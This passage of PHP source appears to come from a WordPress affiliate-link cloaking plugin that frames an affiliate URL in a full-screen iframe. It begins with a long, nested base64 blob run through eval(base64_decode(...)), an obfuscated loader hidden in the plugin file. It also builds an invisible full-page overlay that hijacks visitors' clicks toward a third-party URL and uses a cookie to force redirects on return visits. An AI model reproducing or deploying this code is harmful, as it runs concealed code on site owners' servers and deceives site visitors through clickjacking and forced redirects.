hyWWpGa2MxWllaR0ZTTTBKelZtMTRTMVpzVm5SalJrNVZUVlZ3VmxadE5XOVdiVXBWVW14Q1dtRXhjRXhWYWtwUFUxWldjMkZHVGxOV2JYUXpWbXRrTUZack1WaFViR1JXWW14YVdWbHNWbUZXUmxKWFYyMUdhMDFXYkROV01uTTFZVzFHTmxWcVRscE5SbHA2V1ZkemVHUldWblZVYlVaWFlrWnZlbGRXWkRSa01WcHpWbTVPVkdGNlZrOVdha3B2VXpGWmVVNVlaRkpOVjFKNVZGWldWMkZXU2xkVGJHeFdZa2RTZGxwR1dsTldiRnBaWVVaa2FWWnNjRXBXYTJONFRrWlZlRk51VGxoV1JYQlhWRlprVG1ReGNGWlhiazVxWWxWd1NsWnRlRXRoVmxwVlZtNXdWMVl6VW5KV1IzTjRVakZ3UmxkdGFGTmxiRnBRVjFab2QxSXdNVmRYYmxKUFZsaFNXVlp0Y3pGVFZtUlZWRzVrVjFac2NFZFpibkJEVjBaYVJtTkdhRlppUm5CNlZHMTRTMk50VGtoaVJrNVRWbXhXTkZadGVGZFpWMGw0Vmxoc1YySkhhRmRaYTJSdlYwWmFjbHBHVG1sTlZuQjRWVzAxVDJFeVNrWk9WbWhZWVRGVk1WbFhjM2hYUjFaSFkwWmtVMlZzV1hwV2FrWldaVWROZUZwR1ZsSmlTRUpZV1d4a2IxVldXa2RXYlhSVlRVUldXRmxxVG5OaFZrcHlZMFpvWVZZemFHaFpNVnByWXpGYWMxUnNhR2hsYTFwSlYxUkNZV014V2toVGJGcFBWMFUxVjFsVVNsTlZSbEowWlVoT2FsWnJjSGhXVjNNMVZURmFSMWRZWkZkaVZFSTBWa1JLUzFJeFRuSmFSbWhwWWtWd1dsWlhlR3RpTWxKWFZXeGFXR0p0VWxWVmJYUjNUVVphU0UxVVVsWk5WWEF4VlZjMWExWXdNVWRYYmxwYVlsaE9ORmt5Y3pWV01rcElZa1pPVGxKR1dqWldiR1F3V1ZkTmQwNVZaR0ZTVm5CdlZXNXdWMVF4YkhKaFJVNVVVbTVDVjFaWGVFOVdWVEZ5VjI1c1YwMXFSak5YVmxwaFZqRk9jMkZHY0dsU2JrSlZWbXBDVms1V1pFaFZhMmhwVWxSV1dGVnFUbTlsUmxsNVpVWmtWazFXY0hsVVZsWnJZVVpLV0dWSGFHRldNMDE0VmxWYVdtUXhXblZhUjJocFUwVktXRlpzWkRSa01rcEhWMjVTYUZKWVFsbFpiVFZEVkVaa1YxcEZaRmRpVlhCS1YydGtSMkZGTVhSYVJGcFlWbXhhY2xWcVJtdFdNVloxVm0xd1UwMUdjRnBXVnpFd1dWVXhjMVpZYkd0U2VteHpXV3hXVjA1V1duUmpSbVJYVWpCd1YxUnNhRTlXYlVWNFkwVmtZVll6YUdoVmJYaHJZMVpXY2s5V1RsZFNiSEJMVm0xd1MwMUdVWGhhUm1SVllUSm9ZVlJVU2xOV2JGcDBaVVp3VGxKc2NIbFdiVFZQWVRGYVZWSnNiRlpOYmxJeldWWmFUMU5HYTNwYVJtUlRaV3RaZWxkWGNFdFRNVmw1VWxod2FGSXphRlJWYlhSM1ZWWmtWMXBFVW10TmExcDZXVEJhWVZadFNsWlhiVGxYWWxSR2RsVXllR3RrVjA1R1QxWldhVkpZUVhoV01qVjNVVEZhV0ZOc1ZsTmlSMUpoVm0xNGQyUnNXWGhXV0doWVVtczFlVmt3WkhOV1JrbDVWR3BPVjJFeVRqUmFSRVpLWkRBeFZscEhhRk5XTTJodlYyeGtNR1F4VmxkWFdHUllZbTFTYjFscmFFTldNVnBZWlVoa2FWSnJjREJaVlZaM1YwZEtkVkZyZUZkU00wNDBWakZhZDA1c1JuTldiV3hZVWxWd1NsWnFSbE5UTVZsNFUyeGtZVk5HU2s5V2JURTBWbFpXY1ZOck9VOVNiR3cxVkZWb2IxWlZNWE5UYm5CYVRVWmFkbFpxUmxwbFYxWkhZMFprVjFKWE9UWldSM1JoWkRKT2MyTkZaR0ZTTTFKVVZGVlNWMU14V25OYVNHUlhUVlpLU0ZWc2FHOVdSbHBHVGxaV1dsWkZjSFpVYlhoelZqRmtkRTlXVWxkaWEwVjVWbFprZWs1V1VuTlVhMmhvVW10d1dGWnRNVkpOUmxKeVZsUkdVMkY2VmxkV2JYaFBZVlphVlZadWNGZFdNMUpvVlhwS1QxWXhjRVpYYldoVFpXeGFVRlp0ZUZOU2F6RlhWbGhzYWxORk5WbFZha1poVmpGcmQyRkhSbGhTYTNCWldWVm9WMVpXV2taU1ZFWldZV3R3V0ZWc1dsZGphemxZWlVkc1UxZEZTalJXYWtvMFZqRlZlRnBJVWxkaE1sSnZWV3hrTkdGR2NGaGpla1phVm14c00xWXlOV3RoUjBwSlVXeGtWMVo2UmpOWmExcEtaREExVlZGc2NGZFdNVXBSVjFkMFlWTXhTWGxTV0hCcFVteEtXRlJVU2xKTlJscEZVbTFHYUUxRVZsaFdSelZUVmxkS1dXRkdVbFppVkVWNlZGVmFXbVF4V25SUFYyeG9aV3RKZWxaSGVGZGlNa1pYVTJ0YWFsSnVRbGRVVldSVFkxWndWMWRzVGxkTldFSkhWREZhZDFSdFNrZGpSV1JYWVd0YWRsbHFTa2RXYXpGWFlrZEdiR0V3Y0ZkWFYzUnJWVEpHUjJKR2FHeFNlbXhWVm0wMVFrMXNWWGxOVldSb1ZtczFTVmRVVG10V01VbzJVbXBPVjFaRldubGFWbHBoWTJ4YWMyRkdaRk5XYmtKTlZqRmtNRlV4UlhsVldHaFZWMGRvVmxsclZURlZSbEpXWVVWT1ZGWnRVbmxYV0hCSFlVWmFjbUpFVm1GV1YyaG9WakJhWVdSR1ZuTmhSbFpYWWxaS1VWWnFSbFpsUmtwWVUydG9VMkpYZUZoV2JUVkNUV3haZUdGSVpGUk5WbkI1Vkd4U1YxWkdXa2hWYldoWFRVWndNMWxxUm5OamJGSjBUMWRvVjJKWWFHRldhMk40VGtaUmVWSnVUbFJpVkVaWldWUktVMWRHYkZoTlZYQnNWbXhhTUZwVlZqUlZhekZXWTBSQ1dGWnNjSEpWYWtGNFUwWk9jbUZIYkZSU2JIQjZWbGN4ZDJNeVRsZGlTRVpVWWtVMWNGVnNhRk5XVm14WlkwZHdhRlpVYURWV2JYQkxWMnhaZWxwSVdsaFdla1pJV2xkNGQxWldaRlZSYkd4T1lrVndlbFl4VWtwT1YwVjRZMFpTWVUxdVVtaFpiR1EwWWpGd1JscEVVbXBTTUhBeFdWVmtZVmRyTVhGaVNFcFlZa1UxZVZrd1ZUVk5NVUpWVFVkc1VFMXNXWGxYVm1RellqRnNkRkp1Y0dGV1JtdDNWMFJLVTJKR2EzbFBWM1JoVlRKa2NsZHRNWE5oUjFKSVpVaENhV0p0YUcxWFZFazFZVEZ3VkdFelFsQmtlakE1U1dwMGJHUnRSbk5MUjBwb1l6SlZNazVHT1d0YVYwNTJXa2RWYjBwSFduQlpXRkp6WVZjMU5GZ3lUblphUjFWd1MxUnpQU0k3WlhaaGJDaGlZWE5sTmpSZlpHVmpiMlJsS0NSbWFXRjBiR2x1ZUY5amIyUmxLU2s3IjtldmFsKGJhc2U2NF9kZWNvZGUoJGZpYXRsaW54X2NvZGUpKTs=";eval(base64_decode($fiatlinx_code));	
	//----------------
	
	if($link["ativar_turbo"] == 1 && !empty($link["turbo_url"]) && $exibir_modo_turbo){

		if($link["tipo_modo"]==0){//Camada transparente
			$modo_turbo_code .= '<a href="'.$link["turbo_url"].'" target="_blank" style="" id="modoturbo_overall_anc" ><div style="position:absolute;top:0px;width:98%;height:2400px;background-color:white;z-index:999;display:none;" id="modoturbo_overall"></div></a>';
			$modo_turbo_code .='<script>jQuery_1_11_1("#modoturbo_overall").css({opacity:0});</script>';
		}else{//banner
			$modo_turbo_code .= '<a href="'.$link["turbo_url"].'" target="_blank" style="border:0px;" id="modoturbo_overall_anc" ><div style="position:fixed;top:50%;left:50%;width:400;height:400;background-color:white;z-index:999;display:none;margin-top:-200px;margin-left:-200px;" id="modoturbo_overall"><img src="'.$link['turbo_img'].'" style="z-index:9999;"></div></a>';		
		}
		
		$modo_turbo_code .='<script>
		setTimeout(function(){ jQuery_1_11_1("#modoturbo_overall").css({display:"block"}) }, '. ($link["segundos_apos_turbo"] * 1000) .');
		</script>
		<script>
	    modo_turbo_segundo_url = "'.$link["segundo_url"].'";
		modo_turbo_clique_url = "'.$link["clique_url"].'";
		jQuery_1_11_1(document).ready(function(e) {
		
			if(typeof modo_turbo_clique_url !== \'undefined\'){
				jQuery_1_11_1("a").on("click",function(){';
					if($link["redirect_clique"]==1) $modo_turbo_code .='modo_turbo_action(modo_turbo_clique_url);';
					$modo_turbo_code .='jQuery_1_11_1("#modoturbo_overall_anc").remove();
				});
			}
			
			if(typeof modo_turbo_segundo_url !== \'undefined\'){
				
			';
				
			if($link["redirect_segundo"]==1) $modo_turbo_code .= 'modoturbo_cookie_data = modoturbo_LerCookie("modoturbo_cookie");
				
				modoturbo_GerarCookie("modoturbo_cookie", "1", 180);
				
				if(modoturbo_cookie_data != null){ 
					modo_turbo_action(modo_turbo_segundo_url);
				}';
				
			$modo_turbo_code .='					
			}

			
		});
		
		function modo_turbo_action(novo_url_destino){
			document.location = novo_url_destino;
		}
		
		
		function modoturbo_GerarCookie(strCookie, strValor, lngDias)
			{
				var dtmData = new Date();
				var pathToMyPage = window.location.pathname;
				if(lngDias)
				{
					
					dtmData.setTime(dtmData.getTime() + (lngDias * 60 * 60 * 1000));
					var strExpires = "; expires=" + dtmData.toGMTString();
				}
				else
				{
					var strExpires = "";
				}
				document.cookie = strCookie + "=" + strValor +";path="+ pathToMyPage + strExpires;
			}
			
		function modoturbo_LerCookie(strCookie)
			{
				var strNomeIgual = strCookie + "=";
				var arrCookies = document.cookie.split(\';\');
			
				for(var i = 0; i < arrCookies.length; i++)
				{
					var strValorCookie = arrCookies[i];
					while(strValorCookie.charAt(0) == " ")
					{
						strValorCookie = strValorCookie.substring(1, strValorCookie.length);
					}
					if(strValorCookie.indexOf(strNomeIgual) == 0)
					{
						return strValorCookie.substring(strNomeIgual.length, strValorCookie.length);
					}
				}
				return null;
		}
			
	</script>';		
	}
	
	$pagina = '<!DOCTYPE html>
	<html>
	<head>
	<meta http-equiv="expires" content="Sun, 01 Jan 2014 00:00:00 GMT"/>
	<meta http-equiv="pragma" content="no-cache" />
	<meta name="robots" content="noindex">
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	'. $css .'
	<title>'. $titulo .'</title>
	<meta itemprop="name" content="'. $titulo .'">
	<meta name="twitter:title" content="'. $titulo .'">
	<meta property="og:title" content="'. $titulo .'" />
	<!-- Descricao -->
	<meta itemprop="description" content="'. $descricao . '" />
	<meta name="description" content="'. $descricao .'" />
	<meta name="twitter:description" content="'. $descricao .'" >
	<meta property="og:description" content="'. $descricao .'" >
	<!-- Imagem -->
	<meta itemprop="image" content="'. $imagem .'">
	<meta name="twitter:image" content="'. $imagem .'">
	<meta property="og:image" content="'. $imagem .'" />
	<!-- Twitter -->
	<meta name="twitter:card" content="summary">
	<!-- Open Graph -->
	<meta property="og:type" content="website" />
	<meta property="og:url" content="'. $url_site .'" />	
	<meta name="viewport" content="width=device-width, initial-scale=1.0">		
	';
	$pagina .= $pixel_facebook;
	
	$pagina .= '
	<style>
	*{
		margin:0px;
		border:0px;
		padding:0px;
	}
	body {
		overflow: hidden;
		//overflow: visible;
	}
	html, body, iframe { height: 100%; }
	</style>
	'. $share_estilo .'
	'. $barra_css .'
	'. $js .'
	<script src="'.$anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/hot-parameters.js"></script>
	</head>
	<body>
	<!--Plugin Hot Links Plus '.self::PLUGIN_VERSION.' -->
		' . $barra_html . '
		' . $codigo_topo . '
		'. $conteudo_oculto . '
		'. $bonus .'
		<iframe src="'. $url_afiliado_final .'" height="100%" width="100%" noresize="noresize"></iframe>
		'. $bonus_conteudo .'
	'.$pixel_google.'
	'.$share_html.'
	'.$back_redir_code.'
	<input type="hidden" id="back_redir_hidden" value="'.$back_redir_hidden.'">
	'.$modo_turbo_code.'
	<script>
	jQuery_1_11_1(document).ready(function(e) {
		hot_parameters();
	});
	</script>	
	</body>
	</html>
	';	
		
	echo $pagina;
	exit;			
	
}

exit;
?>